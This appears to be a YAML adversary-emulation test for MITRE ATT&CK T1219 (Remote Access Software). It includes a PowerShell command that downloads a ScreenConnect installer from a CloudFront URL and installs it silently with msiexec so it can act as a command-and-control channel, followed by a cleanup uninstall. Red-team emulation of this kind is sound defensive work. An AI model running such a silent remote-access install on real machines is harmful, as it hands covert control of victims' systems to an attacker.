- id: 4450d056-db96-52d5-984a-b90457f58d61
  name: Soumaia ART Tests - ScreenConnect Application Download and Install on Windows
  description: 'An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.

    Msiexec will be used to quietly insall ScreenConnect. (requires elevation)'
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: Remote Access Software
  platforms:
    windows:
      psh:
        command: |-
          $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
          Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi"
          msiexec /i $installer /qn
        cleanup: |-
          $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
          msiexec /x $installer /qn
